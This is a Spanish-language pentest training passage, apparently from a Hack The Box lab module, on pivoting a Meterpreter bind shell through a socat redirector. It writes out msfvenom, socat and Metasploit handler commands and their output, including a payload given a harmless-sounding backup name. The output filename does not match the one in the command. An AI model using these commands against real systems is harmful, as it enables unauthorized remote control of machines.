Similar a nuestro redireccionador de reverse shell con `socat`, también podemos crear un redireccionador de bind shell con `socat`. Esto es diferente de las reverse shells que se conectan de vuelta desde el servidor de Windows al servidor de Ubuntu y se redirigen a nuestro host de ataque. En el caso de las bind shells, el servidor de Windows iniciará un listener y se vinculará a un puerto en particular. Podemos crear un payload de bind shell para Windows y ejecutarlo en el host de Windows. Al mismo tiempo, podemos crear un redireccionador `socat` en el servidor de Ubuntu, que escuchará conexiones entrantes desde un Metasploit bind handler y las redirigirá a un payload de bind shell en un objetivo de Windows. La figura a continuación debería explicar el pivot de una manera mucho mejor.

![](https://academy.hackthebox.com/storage/modules/158/55.png)

Podemos crear un bind shell usando `msfvenom` con el siguiente comando.

### Creating the Windows Payload

```r
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

Podemos iniciar un `socat bind shell` listener, que escucha en el puerto `8080` y reenvía paquetes al servidor de Windows `8443`.

### Starting Socat Bind Shell Listener

```r
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finalmente, podemos iniciar un Metasploit bind handler. Este bind handler puede configurarse para conectarse al listener de `socat` en el puerto 8080 (servidor Ubuntu).

### Configuring & Starting the Bind multi/handler

```r
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

Podemos ver un bind handler conectado a una solicitud de stage pivotada a través de un listener de `socat` al ejecutar el payload en un objetivo de Windows.

### Establishing Meterpreter Session

```r
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```
